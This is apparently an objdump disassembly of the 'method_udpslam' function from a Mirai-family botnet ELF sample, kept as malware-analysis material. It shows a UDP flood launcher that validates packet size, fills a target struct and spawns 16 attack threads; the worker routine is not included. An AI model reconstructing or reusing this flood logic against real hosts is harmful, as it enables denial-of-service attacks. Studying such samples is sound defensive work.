
/Users/taogoldi/Projects/Malware/Mirai/input/d40cf9c95dcedf4f19e4a5f5bb744c8e98af87eb5703c850e6fda3b613668c28.elf:	file format elf64-x86-64

Disassembly of section .text:

0000000000401280 <method_udpslam>:
  401280: 41 56                        	push	r14
  401282: 41 89 d6                     	mov	r14d, edx
  401285: 41 55                        	push	r13
  401287: 41 54                        	push	r12
  401289: 41 89 f4                     	mov	r12d, esi
  40128c: 55                           	push	rbp
  40128d: 48 89 fd                     	mov	rbp, rdi
  401290: 53                           	push	rbx
  401291: 89 cb                        	mov	ebx, ecx
  401293: 8d 43 ff                     	lea	eax, [rbx - 0x1]
  401296: 48 81 ec d0 00 00 00         	sub	rsp, 0xd0
  40129d: 3d e2 ff 00 00               	cmp	eax, 0xffe2
  4012a2: 76 21                        	jbe	0x4012c5 <method_udpslam+0x45>
  4012a4: be e3 ff 00 00               	mov	esi, 0xffe3
  4012a9: bf c8 4c 41 00               	mov	edi, 0x414cc8
  4012ae: 31 c0                        	xor	eax, eax
  4012b0: e8 1b 6c 00 00               	call	0x407ed0 <printf>
  4012b5: 48 81 c4 d0 00 00 00         	add	rsp, 0xd0
  4012bc: 5b                           	pop	rbx
  4012bd: 5d                           	pop	rbp
  4012be: 41 5c                        	pop	r12
  4012c0: 41 5d                        	pop	r13
  4012c2: 41 5e                        	pop	r14
  4012c4: c3                           	ret
  4012c5: bf f8 4c 41 00               	mov	edi, 0x414cf8
  4012ca: 4c 8d ac 24 80 00 00 00      	lea	r13, [rsp + 0x80]
  4012d2: e8 75 6b 00 00               	call	0x407e4c <puts>
  4012d7: 41 89 d8                     	mov	r8d, ebx
  4012da: 44 89 f1                     	mov	ecx, r14d
  4012dd: 44 89 e2                     	mov	edx, r12d
  4012e0: 48 89 ee                     	mov	rsi, rbp
  4012e3: bf 20 4d 41 00               	mov	edi, 0x414d20
  4012e8: 31 c0                        	xor	eax, eax
  4012ea: e8 e1 6b 00 00               	call	0x407ed0 <printf>
  4012ef: ba 4c 00 00 00               	mov	edx, 0x4c
  4012f4: 31 f6                        	xor	esi, esi
  4012f6: 4c 89 ef                     	mov	rdi, r13
  4012f9: e8 22 88 00 00               	call	0x409b20 <memset>
  4012fe: 48 89 ee                     	mov	rsi, rbp
  401301: ba 3f 00 00 00               	mov	edx, 0x3f
  401306: 4c 89 ef                     	mov	rdi, r13
  401309: 48 8d ac 24 80 00 00 00      	lea	rbp, [rsp + 0x80]
  401311: e8 4e 8a 00 00               	call	0x409d64 <strncpy>
  401316: 44 89 a4 24 c0 00 00 00      	mov	dword ptr [rsp + 0xc0], r12d
  40131e: 89 9c 24 c8 00 00 00         	mov	dword ptr [rsp + 0xc8], ebx
  401325: 49 89 e4                     	mov	r12, rsp
  401328: 44 89 b4 24 c4 00 00 00      	mov	dword ptr [rsp + 0xc4], r14d
  401330: 48 89 e3                     	mov	rbx, rsp
  401333: 31 f6                        	xor	esi, esi
  401335: 48 89 df                     	mov	rdi, rbx
  401338: 4c 89 e9                     	mov	rcx, r13
  40133b: ba 00 21 40 00               	mov	edx, 0x402100
  401340: 48 83 c3 08                  	add	rbx, 0x8
  401344: e8 a7 47 00 00               	call	0x405af0 <pthread_create>
  401349: 48 39 eb                     	cmp	rbx, rbp
  40134c: 75 e5                        	jne	0x401333 <method_udpslam+0xb3>
  40134e: 31 db                        	xor	ebx, ebx
  401350: 49 8b 3c dc                  	mov	rdi, qword ptr [r12 + 8*rbx]
  401354: 31 f6                        	xor	esi, esi
  401356: 48 ff c3                     	inc	rbx
  401359: e8 5d 17 00 00               	call	0x402abb <pthread_join>
  40135e: 48 83 fb 10                  	cmp	rbx, 0x10
  401362: 75 ec                        	jne	0x401350 <method_udpslam+0xd0>
  401364: bf 7d 50 41 00               	mov	edi, 0x41507d
  401369: e8 de 6a 00 00               	call	0x407e4c <puts>
  40136e: 48 81 c4 d0 00 00 00         	add	rsp, 0xd0
  401375: 5b                           	pop	rbx
  401376: 5d                           	pop	rbp
  401377: 41 5c                        	pop	r12
  401379: 41 5d                        	pop	r13
  40137b: 41 5e                        	pop	r14
  40137d: c3                           	ret
  40137e: 66 90                        	nop
